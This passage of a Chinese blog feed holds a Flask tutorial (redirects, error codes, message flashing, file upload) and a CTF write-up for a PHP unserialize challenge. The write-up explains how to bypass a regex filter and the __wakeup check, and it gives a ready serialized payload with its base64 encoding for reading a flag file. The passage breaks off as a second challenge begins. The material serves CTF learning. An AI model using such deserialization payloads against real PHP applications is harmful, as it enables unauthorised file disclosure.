title="重定向和错误"></a>重定向和错误</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> request.form[<span class="string">'username'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'logged in successfully'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>当用户输入不为admin时则直接302重定向到login界面</p><p>login.html</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">      &lt;form action = <span class="string">"http://192.168.0.102:5000/login"</span> method = <span class="string">"post"</span>&gt;</span><br><span class="line">         &lt;p&gt;Enter Name:&lt;/p&gt;</span><br><span class="line">         &lt;p&gt;&lt;input type = "text" name = "username" /&gt;&lt;/p&gt;</span><br><span class="line">         &lt;p&gt;&lt;input type = "submit" value = "submit" /&gt;&lt;/p&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session,abort</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">401</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'logged in successfully'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>Flask.abort(code)</code>：带有错误代码的abort函数</p><ul><li><strong>400</strong> - 用于错误请求</li><li><strong>401</strong> - 用于未身份验证的</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - 未不到</li><li><strong>406</strong> - 表示不接受</li><li><strong>415</strong> - 用于不支持的媒体类型</li><li><strong>429</strong> - 请求过多</li></ul><p>若登录不是admin则报401：<code>Unauthorized</code>错误</p><h2 id="消息闪现"><a href="#消息闪现" class="headerlink" title="消息闪现"></a>消息闪现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session,abort,flash</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">12</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'admin'</span> <span class="keyword">or</span> request.form[<span class="string">'password'</span>] != <span class="string">'admin'</span>:</span><br><span class="line">            error = <span class="string">'Invalid username or password. Please try again!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">'You were successfully logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error = error)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>flash(message, category)</code>：将消息传递给下一个请求，该请求通常是一个模板。</p><ul><li><strong>message</strong>：参数是要闪现的实际消息。</li><li><strong>category</strong>：参数是可选的。它可以是“error”，“info”或“warning”。</li></ul><p><code>get_flashed_messages(with_categories, category_filter)</code>：从会话中删除消息</p><p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。第一个默认为False</p><p>典型的消息闪现模板：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">   &#123;% if messages %&#125;</span><br><span class="line">      &#123;% for message in messages %&#125;</span><br><span class="line">         &#123;&#123;  message &#125;&#125;</span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">   &#123;% endif %&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><p>下面给出html代码：</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">    &#123;% if messages %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          &#123;% for message in messages %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123; &#123;  message &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"> &#123;% endwith %&#125;</span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flask Message Flashing Example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>Do you want to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">"&#123;&#123;  url_for('login') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>log in?<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   &#123;% if error %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &#123;&#123;  error &#125;&#125;</span><br><span class="line">   &#123;% endif %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">""</span> <span class="attr">method</span> = <span class="string">post</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">text</span> <span class="attr">name</span> = <span class="string">username</span> <span class="attr">value</span> = <span class="string">"&#123;&#123; request.form.username &#125;&#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">password</span> <span class="attr">name</span> = <span class="string">password</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">submit</span> <span class="attr">value</span> = <span class="string">Login</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:5000/</code>点击login后进入登录界面，随后如果输入的username和password不是admin的话会在界面上显示error消息，若登录成功则跳转到index页面上方显示登录成功消息</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload new File<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">    &#123;% if messages %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          &#123;% for message in messages %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;  message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"> &#123;% endwith %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload new File<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">multipart/form-data</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, flash, request, redirect, url_for,send_from_directory,render_template</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">r'E:\\flask\\upload\\'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123; <span class="string">'txt'</span>, <span class="string">'pdf'</span>, <span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line">app.secret_key = os.urandom(<span class="number">12</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span>  <span class="comment">#判断上传的文件是否非法</span></span><br><span class="line">    <span class="keyword">if</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS:</span><br><span class="line">        <span class="keyword">return</span> filename</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flash(<span class="string">'illegal file'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="comment"># check if the post request has the file part</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">            flash(<span class="string">'No file part'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'upload'</span>))</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]  </span><br><span class="line">        <span class="comment"># if user does not select file, browser also</span></span><br><span class="line">        <span class="comment"># submit an empty part without filename</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">'No selected file'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):  </span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))<span class="comment">#save方法保存文件</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'uploaded_file'</span>,filename=filename))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'upload'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/uploads/&lt;filename&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploaded_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">'UPLOAD_FOLDER'</span>],filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>不得不说，官方的代码还是要强一些，当上传为空时会报错，非法文件也会报错，但上传成功后跳转到上传的文件url处</p><p> <code>UPLOAD_FOLDER</code> 是上传文 件要储存的目录， <code>ALLOWED_EXTENSIONS</code> 是允许上传的文件扩展名的集合，<code>MAX_CONTENT_LENGTH</code>是限制的上传文件的大小</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li><li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li><li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li><li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li></ul><p>参考链接：</p><blockquote><p><a href="https://dormousehole.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">https://dormousehole.readthedocs.io/en/latest/index.html</a>     （官方文档）</p><p><a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/</a>   （W3Cschool教程）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2020/03/22/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/03/22/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">链接</a></p><p>题目代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p><p>题目限制条件：</p><blockquote><p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p></blockquote><p>可是这两种方法都可以进行绕过：</p><blockquote><p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p><p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p></blockquote><p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:{s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;}</code></p><p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">序列化后：</span><br><span class="line">v1 表示 <span class="keyword">public</span>   %<span class="number">00</span>Demo%<span class="number">00</span>v2 表示 <span class="keyword">private</span>(Demo为类名)   %<span class="number">00</span>*%<span class="number">00</span>v3 表示 <span class="keyword">protected</span>  v1,v2,v3为属性名</span><br></pre></td></tr></table></figure><p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>参考：<br><a href="https://www.jianshu.com/p/8f498198fc3d" target="_blank" rel="noopener">php序列化与反序列化入门</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html" target="_blank" rel="noopener">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html" target="_blank" rel="noopener">__wakeup()函数漏洞以及实际漏洞分析</a></p></blockquote><p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p><h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://i.loli.net/2020/03/26/mc7KMXetjsbAlBY.png" alt="image-20200324104326758.png"></p><p>题目提示网站有备份，于是访问<a href="http://www.zip，得到网页源码：">www.zip，得到网页源码：</a></p><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 